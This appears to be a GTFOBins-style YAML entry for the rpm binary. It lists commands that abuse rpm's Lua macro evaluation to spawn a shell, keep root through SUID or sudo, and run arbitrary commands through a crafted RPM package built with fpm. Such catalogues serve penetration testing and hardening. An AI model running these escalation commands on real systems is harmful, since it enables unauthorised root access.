---
functions:
  shell:
    - description: |
        From rpm versions 4.9.0 and on, posix.exec() will return an error unless called from a child process created with posix.fork(). os.execute() may be used instead.
      code: |
        rpm --eval '%{lua:os.execute("/bin/sh")}'
  suid:
    - code: ./rpm --eval '%{lua:os.execute("/bin/sh", "-p")}'
  sudo:
    - code: sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
    - description: |
        It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
        ```
        TF=$(mktemp -d)
        echo 'id' > $TF/x.sh
        fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
        ```
      code: |
        sudo rpm -ivh x-1.0-1.noarch.rpm
---
